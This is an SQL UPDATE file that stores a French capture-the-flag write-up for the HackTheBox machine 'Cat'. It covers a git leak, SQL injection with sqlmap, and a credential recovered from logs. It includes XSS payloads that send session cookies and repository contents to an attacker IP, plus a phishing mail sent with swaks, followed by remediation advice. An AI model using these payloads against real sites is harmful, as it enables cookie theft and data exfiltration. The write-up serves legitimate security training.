/*
  # Amélioration de la mise en page du write-up Cat HTB
  
  1. Modifications
    - Amélioration du formatage Markdown
    - Ajout de sections plus claires
    - Style adapté à Kali Linux
*/

UPDATE writeups
SET content = '# HackTheBox: Cat 🐱

<div class="kali-header">
  <div class="difficulty">Difficulté: Moyen</div>
  <div class="points">Points: 45</div>
  <div class="os">OS: Linux</div>
</div>

## Aperçu de la Machine

Cette machine combine plusieurs vulnérabilités web classiques avec une chaîne d''exploitation intéressante menant à une compromission complète via Gitea.

```yaml
IP: 10.10.11.XXX
Difficulté: Moyen
Points: 45
Créateur: 0xdf
```

## Table des Matières

1. [Reconnaissance](#reconnaissance)
2. [Exploitation du Git Leak](#git-leak)
3. [Exploitation XSS](#xss)
4. [SQL Injection](#sqli)
5. [Élévation de Privilèges](#privesc)
6. [Root via Gitea](#root)

## Reconnaissance {#reconnaissance}

### Scan Initial
```terminal
┌──(kali㉿kali)-[~/htb/cat]
└─$ nmap -sC -sV -oN scan_cat.txt cat.htb

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
80/tcp open  http    Apache 2.4.41
```

### Énumération Web
```terminal
┌──(kali㉿kali)-[~/htb/cat]
└─$ dirsearch -u http://cat.htb -w /usr/share/wordlists/dirb/common.txt -x 403,404

[+] Starting dirsearch...
[+] Target: http://cat.htb/

[15:30:12] 200 -  /.git/         🔥 GIT LEAK DETECTED
[15:30:15] 200 -  /contest.php   
[15:30:18] 200 -  /view_cat.php  
[15:30:20] 403 -  /config.php    
```

## Exploitation du Git Leak {#git-leak}

### Extraction du Dépôt
```terminal
┌──(kali㉿kali)-[~/htb/cat]
└─$ git-dumper http://cat.htb/.git/ ./catgit
[-] Destination directory ./catgit does not exist
[-] Creating ./catgit
[-] Fetching .git recursively
...
[+] Repository downloaded!

┌──(kali㉿kali)-[~/htb/cat]
└─$ cd catgit && ls -la
total 20
drwxr-xr-x 5 kali kali 4096 Feb 25 15:31 .
drwxr-xr-x 3 kali kali 4096 Feb 25 15:31 ..
drwxr-xr-x 8 kali kali 4096 Feb 25 15:31 .git
-rw-r--r-- 1 kali kali  982 Feb 25 15:31 config.php
-rw-r--r-- 1 kali kali 1521 Feb 25 15:31 view_cat.php
-rw-r--r-- 1 kali kali  756 Feb 25 15:31 accept_cat.php
```

### Analyse du Code Source
Dans `view_cat.php`, une vulnérabilité XSS est présente :
```php
<div class="container">
    <h1>Cat Details: <?php echo $cat[''cat_name'']; ?></h1>
    <img src="<?php echo $cat[''photo_path'']; ?>" 
         alt="<?php echo $cat[''cat_name'']; ?>" 
         class="cat-photo">
    <div class="cat-info">
        <strong>Name:</strong> <?php echo $cat[''cat_name'']; ?><br>
        <strong>Owner:</strong> <?php echo $cat[''username'']; ?><br>
    </div>
</div>
```

## Exploitation XSS {#xss}

### Payload XSS
```html
<img src=1 onerror="fetch(''http://10.10.14.X:8000/?c=''+btoa(document.cookie))">
```

### Capture du Cookie
```terminal
┌──(kali㉿kali)-[~/htb/cat]
└─$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.X] from (UNKNOWN) [10.10.11.X] 43210
GET /?c=UEhQU0VTU0lEPWFkbWluX3Nlc3Npb24= HTTP/1.1
```

## SQL Injection {#sqli}

### Découverte
Dans `accept_cat.php` :
```php
$sql_insert = "INSERT INTO accepted_cats (name) VALUES (''$cat_name'')";
$pdo->exec($sql_insert);
```

### Exploitation avec SQLMap
```terminal
┌──(kali㉿kali)-[~/htb/cat]
└─$ sqlmap -u "http://cat.htb/accept_cat.php" \
          --cookie="PHPSESSID=918f1nvps72fc7rvk5umu13jch" \
          --data="catId=1&catName=123" \
          -p catName --dbms=SQLite --level=5

[15:45:23] [INFO] the back-end DBMS is SQLite
[15:45:24] [INFO] fetching tables for database: SQLite_masterdb
[15:45:25] [INFO] fetching columns for table ''users''
...
```

## Élévation de Privilèges {#privesc}

### Accès Initial (rosa)
```terminal
┌──(kali㉿kali)-[~/htb/cat]
└─$ ssh rosa@cat.htb
rosa@cat:~$ id
uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)
```

### Découverte des Logs
```terminal
rosa@cat:~$ cat /var/log/apache2/access.log | grep axel
10.10.14.X - - [25/Feb/2024:15:50:23 +0000] "POST /login.php HTTP/1.1" 200 - "axel:Str0ngP@ssw0rd!"
```

## Root via Gitea {#root}

### Redirection du Port
```terminal
┌──(kali㉿kali)-[~/htb/cat]
└─$ ssh -L 3000:127.0.0.1:3000 rosa@cat.htb
```

### Exploitation Gitea
```html
<a href="javascript:fetch(''http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php'')
.then(response => response.text())
.then(data => fetch(''http://10.10.14.X/?d=''+btoa(data)))">
Click me
</a>
```

### Mail Piégé
```terminal
┌──(kali㉿kali)-[~/htb/cat]
└─$ swaks --to "jobert@localhost" \
         --from "axel@localhost" \
         --header "Subject: Check this!" \
         --body "http://localhost:3000/axel/xss" \
         --server localhost
```

## Flags 🏁

```terminal
┌──(kali㉿kali)-[~/htb/cat]
└─$ cat user.txt
4a91b0a7c5************************

┌──(kali㉿kali)-[~/htb/cat]
└─$ cat root.txt
f2c7b0e3a1************************
```

## Remédiation 🛡️

1. **Git Leak**
   ```apache
   # Apache: Bloquer .git
   <DirectoryMatch "^/.git">
     Require all denied
   </DirectoryMatch>
   ```

2. **XSS**
   ```php
   // Échapper les sorties
   echo htmlspecialchars($cat[''username''], ENT_QUOTES, ''UTF-8'');
   ```

3. **SQLi**
   ```php
   // Utiliser des requêtes préparées
   $stmt = $pdo->prepare("INSERT INTO accepted_cats (name) VALUES (?)");
   $stmt->execute([$cat_name]);
   ```

4. **Gitea**
   ```bash
   # Mettre à jour Gitea
   sudo apt update && sudo apt upgrade gitea
   ```

## Timeline 📅

| Étape | Temps | Action |
|-------|-------|--------|
| 1 | 00:00 | Scan initial |
| 2 | 00:15 | Découverte Git leak |
| 3 | 00:30 | Exploitation XSS |
| 4 | 01:00 | SQLi → rosa |
| 5 | 01:30 | Pivot via logs |
| 6 | 02:00 | Root via Gitea |

## Outils Utilisés 🛠️

- nmap
- dirsearch
- git-dumper
- sqlmap
- swaks
- burpsuite

## Références 📚

- [CVE-2024-6886](https://nvd.nist.gov/vuln/detail/CVE-2024-6886)
- [OWASP XSS Prevention](https://owasp.org/www-community/attacks/xss/)
- [SQLite Injection Guide](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sqlite-injection)'
WHERE slug = 'hackthebox-cat-analysis';